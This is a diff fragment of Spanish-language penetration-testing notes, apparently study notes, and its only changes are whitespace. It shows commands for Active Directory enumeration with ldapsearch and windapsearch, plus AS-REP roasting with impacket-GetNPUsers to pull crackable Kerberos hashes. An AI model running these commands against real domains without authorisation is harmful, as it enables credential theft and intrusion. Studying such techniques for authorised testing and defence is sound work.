@@ -25,13 +25,13 @@
 	# ejemplo proporcionando credenciales y buscando usuarios con logon script -> scritp que se ejecuta al iniciar sesión
 	ldapsearch -h $target -D "CN=user,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(scriptPath=*)" sAMAccountName scriptPath
 	```
-- `windapsearch` - menos técnico
+- `windapsearch` - menos técnico 
 	```bash
 	# se podría omitir usuario y contraseña si no se tiene info
 	python windapsearch.py -d $domain --dc-ip $target -u $username -p $password
 	
 	```
-#### 🦆 [[Miscelaneo#ASREPRoasting| ASReproasting]]
+#### 🦆 [[Miscelaneo#ASREPRoasting| ASReproasting]] 
 - Buscar cuentas sin preautenticación Kerberos (con credenciales de usuario)
 	```bash
 	impacket-GetNPUsers -dc-ip $dcip -request -outputfile hash_asreproast $domain/$username:$password
